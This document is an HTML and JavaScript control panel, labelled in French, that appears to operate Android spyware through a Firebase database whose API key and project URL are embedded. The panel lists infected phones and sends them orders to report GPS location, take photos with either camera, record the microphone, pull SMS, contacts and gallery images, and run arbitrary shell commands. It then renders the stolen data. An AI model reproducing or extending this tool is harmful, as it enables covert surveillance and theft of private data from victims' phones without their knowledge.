<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Panel</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Courier New',monospace;background:#0a0a0a;color:#0f0;padding:20px}
        .header{background:linear-gradient(135deg,#1a1a1a,#0d0d0d);padding:20px;border:1px solid #0f0;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
        .cp{background:#111;border:1px solid #333;padding:20px;margin-bottom:20px;display:flex;flex-wrap:wrap;align-items:center;gap:10px}
        select,input{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:10px 15px;font-family:monospace}
        .btn{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:10px 20px;cursor:pointer;font-family:monospace;transition:.2s}
        .btn:hover{background:#0f0;color:#000}
        .btn-danger{border-color:#f00;color:#f00}
        .btn-danger:hover{background:#f00;color:#fff}
        .stats{display:flex;gap:20px;margin-bottom:20px}
        .stat{background:#111;border:1px solid #333;padding:15px 25px;text-align:center}
        .stat .n{font-size:24px;font-weight:bold;color:#0f0}
        .stat .l{font-size:11px;color:#888;margin-top:5px}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-bottom:20px}
        .card{background:#111;border:1px solid #333;border-left:4px solid #f00;padding:15px;cursor:pointer;transition:.2s}
        .card:hover{border-color:#0f0;transform:translateY(-2px)}
        .card.online{border-left-color:#0f0}
        .card .id{font-size:14px;font-weight:bold}
        .card .m{font-size:11px;color:#888;margin:5px 0}
        .card .meta{font-size:10px;color:#666;display:flex;gap:10px;flex-wrap:wrap}
        .card .badge{background:#1a3a1a;color:#0f0;padding:2px 8px;border-radius:10px;font-size:10px}
        .card .badge.off{background:#3a1a1a;color:#f00}
        .chip{background:#222;color:#aaa;padding:2px 8px;border-radius:3px;font-size:10px}
        #detail{background:#0d0d0d;border:1px solid #333;padding:20px;margin-top:20px}
        #detail h3{color:#0f0;margin-bottom:15px;border-bottom:1px solid #333;padding-bottom:10px}
        #exfil{max-height:600px;overflow-y:auto}
        .entry{border-bottom:1px solid #1a1a1a;padding:10px;margin-bottom:5px}
        .entry .tb{display:inline-block;padding:2px 8px;border-radius:3px;font-size:10px;font-weight:bold}
        .tb-location{background:#0a2a0a;color:#0f0}
        .tb-sms{background:#1a1a3a;color:#88f}
        .tb-call{background:#2a1a0a;color:#fa0}
        .tb-contacts{background:#2a0a0a;color:#f44}
        .tb-heartbeat{background:#0a2a2a;color:#0ff}
        .tb-gallery{background:#1a1a1a;color:#aaa}
        .entry .t{font-size:10px;color:#666;float:right}
        .entry pre{font-size:11px;color:#aaa;white-space:pre-wrap;margin-top:5px;max-height:100px;overflow-y:auto}
        .entry a{color:#0ff;text-decoration:none;font-size:11px}
        .entry a:hover{text-decoration:underline}
        img.ex{max-width:200px;max-height:200px;margin-top:5px;border:1px solid #333}
        .hidden{display:none}
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1 style="font-size:18px;">◉ C2 PANEL</h1>
            <div id="status" style="font-size:12px;color:#888;">Connexion...</div>
        </div>
    </div>

    <div class="stats">
        <div class="stat"><div class="n" id="totalAgents">0</div><div class="l">APPAREILS</div></div>
        <div class="stat"><div class="n" id="onlineAgents">0</div><div class="l">EN LIGNE</div></div>
        <div class="stat"><div class="n" id="totalExfil">0</div><div class="l">DONNÉES</div></div>
    </div>

    <div class="cp">
        <label>Appareil:</label>
        <select id="agentSelect" style="min-width:200px;"><option value="">— Sélectionner —</option></select>
        <label>Ordre:</label>
        <select id="commandSelect">
            <option value="PING">🏓 Ping</option>
            <option value="LOCATION">📍 GPS</option>
            <option value="CAMERA_FRONT">📸 Caméra Avant</option>
            <option value="CAMERA_BACK">📸 Caméra Arrière</option>
            <option value="MIC">🎤 Micro 30s</option>
            <option value="SMS">📋 SMS</option>
            <option value="CONTACTS">📋 Contacts</option>
            <option value="GALLERY">🖼️ Galerie</option>
            <option value="SLEEP">😴 Veille</option>
            <option value="SHELL">💻 Shell</option>
        </select>
        <input type="text" id="shellCmd" placeholder="ls -la /sdcard" style="display:none;width:250px;">
        <button class="btn" onclick="sendOrder()">▶ EXÉCUTER</button>
        <button class="btn btn-danger" onclick="clearAgent()">✕</button>
    </div>

    <div class="grid" id="agentsList"><div style="color:#555;padding:20px;text-align:center;">En attente d'appareils...</div></div>

    <div id="detail" class="hidden">
        <h3 id="detailTitle">Appareil — </h3>
        <div id="exfil">Sélectionnez un appareil.</div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAsFCpjSNUF4XdteSJSUHes6307L8PzneE",
            authDomain: "androidc2project.firebaseapp.com",
            databaseURL: "https://androidc2project-default-rtdb.firebaseio.com",
            projectId: "androidc2project"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let currentAgent = null;
        let exfilListener = null;
        let devices = {};

        document.getElementById('commandSelect').onchange = function() {
            document.getElementById('shellCmd').style.display = this.value === 'SHELL' ? 'inline' : 'none';
        };

        // Écouter sur "devices" au lieu de "agents"
        db.ref('devices').on('value', snap => {
            devices = snap.val() || {};
            updateUI();
        });

        function isOnline(id) {
            const d = devices[id];
            if (!d) return false;
            // Un heartbeat récent (< 60s) = en ligne
            if (d.heartbeat && d.heartbeat.timestamp) {
                const now = Date.now();
                const ts = d.heartbeat.timestamp;
                // gérer timestamp en secondes ou millisecondes
                const t = ts > 9999999999 ? ts : ts * 1000;
                return (now - t) < 60000;
            }
            return false;
        }

        function getDeviceInfo(id) {
            const d = devices[id];
            if (!d) return { model: '?', manufacturer: '?', android: '?', last_seen: '?' };
            const hb = d.heartbeat || {};
            return {
                model: hb.model || hb.device || '?',
                manufacturer: hb.manufacturer || hb.brand || '?',
                android: hb.android || hb.sdk || '?',
                last_seen: hb.timestamp ? new Date(hb.timestamp > 9999999999 ? hb.timestamp : hb.timestamp * 1000).toLocaleString() : '?'
            };
        }

        function countEntries(id) {
            const d = devices[id];
            if (!d) return 0;
            let count = 0;
            ['contacts', 'gallery', 'heartbeat'].forEach(key => {
                if (d[key] && typeof d[key] === 'object') {
                    // Ne pas compter heartbeat comme donnée exfil
                    if (key !== 'heartbeat') {
                        count += Object.keys(d[key]).length;
                    }
                }
            });
            return count;
        }

        function getAllEntries(id) {
            const d = devices[id];
            if (!d) return [];
            const entries = [];
            // Contacts
            if (d.contacts && typeof d.contacts === 'object') {
                Object.values(d.contacts).forEach(item => {
                    if (item && typeof item === 'object') {
                        entries.push({ type: 'contacts', ...item });
                    }
                });
            }
            // Gallery
            if (d.gallery && typeof d.gallery === 'object') {
                Object.values(d.gallery).forEach(item => {
                    if (item && typeof item === 'object') {
                        entries.push({ type: 'gallery', ...item });
                    }
                });
            }
            // Heartbeat (infos appareil)
            if (d.heartbeat && typeof d.heartbeat === 'object') {
                entries.push({ type: 'heartbeat', ...d.heartbeat });
            }
            return entries;
        }

        function updateUI() {
            const ids = Object.keys(devices).sort((a,b) => (isOnline(b)?1:0)-(isOnline(a)?1:0));
            let online = 0, totalEx = 0;
            const sel = document.getElementById('agentSelect');
            const cur = sel.value;
            sel.innerHTML = '<option value="">— Sélectionner —</option>';
            const list = document.getElementById('agentsList');
            list.innerHTML = '';

            ids.forEach(id => {
                const info = getDeviceInfo(id);
                const ol = isOnline(id);
                if(ol) online++;
                const ec = countEntries(id);
                totalEx += ec;

                const opt = document.createElement('option');
                opt.value = id;
                opt.textContent = `${id.substring(0,8)} (${info.model}) ${ol?'●':'○'}`;
                sel.appendChild(opt);

                const card = document.createElement('div');
                card.className = `card ${ol?'online':''}`;
                card.innerHTML = `<div class="id">${id.substring(0,8)}</div>
                    <div class="m">${info.manufacturer} • ${info.model}</div>
                    <div class="meta">
                        <span class="chip">Android ${info.android}</span>
                        <span class="badge ${ol?'':'off'}">${ol?'● EN LIGNE':'○ HORS LIGNE'}</span>
                        <span class="chip">📦 ${ec}</span>
                    </div>
                    <div class="meta" style="margin-top:5px;font-size:9px;">Vu: ${info.last_seen}</div>`;
                card.onclick = () => selectAgent(id);
                list.appendChild(card);
            });

            document.getElementById('totalAgents').textContent = ids.length;
            document.getElementById('onlineAgents').textContent = online;
            document.getElementById('totalExfil').textContent = totalEx;
            document.getElementById('status').textContent = `✓ ${ids.length} appareil(s) — ${online} en ligne`;

            if(cur && devices[cur]) sel.value = cur;
            else if(currentAgent && devices[currentAgent]) sel.value = currentAgent;
            else {
                const fos = ids.find(id => isOnline(id));
                if(fos) { sel.value = fos; selectAgent(fos); }
            }

            if(!ids.length) list.innerHTML = '<div style="color:#555;padding:20px;text-align:center;">En attente...</div>';
        }

        function selectAgent(id) {
            currentAgent = id;
            document.getElementById('agentSelect').value = id;
            const info = getDeviceInfo(id);
            document.getElementById('detail').classList.remove('hidden');
            document.getElementById('detailTitle').textContent = `Appareil — ${id.substring(0,8)} (${info.model})`;

            if(exfilListener) { exfilListener.off(); exfilListener = null; }

            const div = document.getElementById('exfil');
            div.innerHTML = 'Chargement...';

            // Écouter sur devices/{id} au lieu de agents/{id}/exfil
            exfilListener = db.ref(`devices/${id}`).on('value', snap => {
                const data = snap.val();
                if(!data) { div.innerHTML = '<div style="color:#555;padding:10px;">Aucune donnée.</div>'; return; }

                const entries = getAllEntries(id);
                if(entries.length === 0) {
                    div.innerHTML = '<div style="color:#555;padding:10px;">Aucune donnée.</div>';
                    return;
                }

                let html = '';
                entries.reverse().forEach(e => {
                    if(!e || !e.type) return;
                    const t = e.type.toLowerCase();
                    let cls = 'tb-'+t, icon='', content='';
                    switch(t) {
                        case 'heartbeat':
                            icon='💓';
                            content = `<strong>Appareil</strong>: ${e.manufacturer||'?'} ${e.model||'?'}<br>
                                       <strong>Android</strong>: ${e.android||'?'} (SDK: ${e.sdk||'?'})<br>
                                       <strong>Batterie</strong>: ${e.battery||'?'}%<br>
                                       <strong>Réseau</strong>: ${e.network||'?'} • ${e.carrier||'?'}<br>
                                       <strong>IP</strong>: ${e.ip||'?'}<br>
                                       <strong>Timestamp</strong>: ${e.timestamp ? new Date(e.timestamp > 9999999999 ? e.timestamp : e.timestamp * 1000).toLocaleString() : '?'}`;
                            break;
                        case 'contacts':
                            icon='👤';
                            content = `<strong>Nom</strong>: ${e.name||e.display_name||'?'}<br>
                                       <strong>Tél</strong>: ${e.phone||e.number||'?'}<br>
                                       ${e.email ? '<strong>Email</strong>: '+e.email+'<br>' : ''}`;
                            break;
                        case 'gallery':
    icon='🖼️';
    let img='';
    if(e.data&&typeof e.data=='string'){
        let b=e.data;
        if(b.startsWith('data:')) b=b.replace(/^data:\s*/,'');
        if(b.length>50){
            let ext=b.startsWith('9j/')?'jpeg':'png';
            img='<img src="data:image/'+ext+';base64,'+b+'" class="ex" onerror=this.style.display="none">';
            if(b.length>500000) img='<details><summary>🖼️ '+(b.length/1024/1024).toFixed(1)+' MB</summary>'+img+'</details>';
        }
    }
    content='<strong>Fichier</strong>: '+(e.name||'?')+'<br>'+img+(e.url?' <a href="'+e.url+'" target="_blank">[Lien]</a>':'');
    break;
                        default:
                            icon='📄';
                            content = `<pre>${JSON.stringify(e, null, 2).substring(0,400)}</pre>`;
                    }
                    html += `<div class="entry"><div><span class="tb ${cls}">${icon} ${t.toUpperCase()}</span><span class="t">${new Date().toLocaleTimeString()}</span></div><div style="margin-top:5px;">${content}</div></div>`;
                });
                div.innerHTML = html || '<div style="color:#555;padding:10px;">Rien.</div>';
            });
        }

        function sendOrder() {
            const id = document.getElementById('agentSelect').value;
            const cmd = document.getElementById('commandSelect').value;
            if(!id) { alert('Sélectionne un appareil'); return; }
            let order = cmd;
            if(cmd === 'SHELL') {
                const sc = document.getElementById('shellCmd').value.trim();
                if(!sc) { alert('Entre une commande'); return; }
                order = 'SHELL '+sc;
            }
            // Écrire dans devices/{id}/orders au lieu de agents/{id}/orders
            db.ref(`devices/${id}/orders`).set(order)
                .then(() => {
                    document.getElementById('status').textContent = `🚀 Envoyé: ${order}`;
                    setTimeout(() => db.ref(`devices/${id}/orders`).remove(), 5000);
                })
                .catch(err => { document.getElementById('status').textContent = `❌ ${err.message}`; });
        }

        function clearAgent() {
            currentAgent = null;
            document.getElementById('agentSelect').value = '';
            document.getElementById('detail').classList.add('hidden');
            if(exfilListener) { /* on ne peut pas off() directement ici car on utilise on() sans ref */ }
        }
    </script>
</body>
</html>
